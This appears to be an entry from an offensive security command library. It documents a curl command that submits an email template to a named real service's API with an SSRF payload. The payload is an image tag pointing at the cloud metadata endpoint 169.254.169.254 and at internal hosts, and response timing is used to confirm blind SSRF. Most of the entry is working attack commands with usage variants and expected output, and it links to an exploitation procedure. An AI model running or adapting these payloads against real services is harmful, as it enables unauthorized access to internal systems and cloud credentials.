---
data: >-
  curl -w "%{time_total} seconds\n" -X POST
  'https://app.stripo.email/api/templates' -H 'Authorization: Bearer YOUR_TOKEN'
  -H 'Content-Type: application/json' -d '{"name":"Timing Test","content":"<img
  src=\"http://169.254.169.254/latest/meta-data/\">"}'
tags:
  - ssrf
  - timing-attack
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.517Z'
id: 081f0fa0-5d6d-42ae-8842-e5201dbce65b
verified: false
validated: true
submitted: true
---
# curl-timing-test

## Command

```bash
curl -w "%{time_total} seconds\n" -X POST 'https://app.stripo.email/api/templates' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"name":"Timing Test","content":"<img src=\"http://169.254.169.254/latest/meta-data/\">"}'
```

## Description

This command performs a timing-based verification of Blind SSRF by measuring the total response time when submitting a template with an internal URL payload, helping confirm if the server made the unauthorized request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-w "%{time_total} seconds\n"` | Writes total time to output | Yes |
| `-X POST` | HTTP method | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Auth header | Yes |
| `-d '{...}'` | Payload with SSRF URL | Yes |

## Examples

### Basic Usage

```bash
curl -w "%{time_total} seconds\n" -X POST 'https://app.stripo.email/api/templates' -H 'Authorization: Bearer token123' -d '{"content":"<img src=\"http://internal/\">"}'
```

### Advanced Usage

```bash
curl -w "time: %{time_total}s, connect: %{time_connect}s\n" -X POST 'https://app.stripo.email/api/templates' -H 'Authorization: Bearer token123' -d '{"content":"<img src=\"http://slow.internal/\">"}'
```

## Expected Output

Response body with template details followed by timing, e.g., {"id": "123"} time: 2.5 seconds. Longer times indicate SSRF success.

## Related

- [[Related Procedure: Exploiting-Blind-SSRF-in-Email-Template-Creation]]
